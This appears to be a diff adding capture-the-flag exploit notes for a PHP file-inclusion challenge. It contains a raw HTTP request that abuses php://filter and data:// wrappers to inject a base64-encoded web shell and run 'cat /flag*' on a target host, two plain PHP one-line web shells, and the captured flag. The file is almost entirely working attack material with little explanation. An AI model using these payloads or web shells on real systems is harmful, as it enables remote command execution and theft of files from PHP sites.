@@ -1,0 +1,14 @@
+test payload:
+GET /?file=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt&cmd=cat+/flag* HTTP/1.1
+Host: 18.143.200.117:31072
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+<?php echo system($_GET['cmd']); echo "hacked"; ?>
+<?php system($_GET['cmd']);echo"hacked";?>
+
+flag:CHH{pHp_A11Ow_url_INCLud3_72eff544d8342b29a86ac692693edaf2}
